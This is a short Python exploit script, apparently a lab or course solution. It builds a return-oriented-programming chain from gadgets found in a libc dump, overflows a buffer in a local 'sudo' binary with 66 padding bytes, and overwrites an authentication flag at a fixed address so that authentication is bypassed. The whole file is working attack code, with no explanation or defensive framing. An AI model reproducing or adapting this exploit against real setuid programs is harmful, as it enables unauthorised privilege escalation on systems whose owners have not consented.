import os, sys
import struct
import assemble
from search import GadgetSearch


PATH_TO_SUDO = './sudo'
LIBC_DUMP_PATH = './libc.bin'


def get_arg():
	auth_address = 0x0804A054
	original_return_address  = 0x80488C6
	import search
	gs = search.GadgetSearch('libc.bin',0xb7c39750)
	pop_edx = gs.find('POP EDX').decode("hex")[::-1]
	mov_eax_0 = gs.find('MOV EAX, -1').decode("hex")[::-1]
	inc_eax = gs.find('INC EAX').decode("hex")[::-1]
	mov_addressedx_eax = gs.find('MOV [EDX], EAX').decode("hex")[::-1]
	return 'a'*66 + pop_edx + struct.pack('<I',auth_address) + mov_eax_0 + inc_eax + inc_eax + mov_addressedx_eax + struct.pack('<I',original_return_address)


def main(argv):
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, get_arg())


if __name__ == '__main__':
    main(sys.argv)
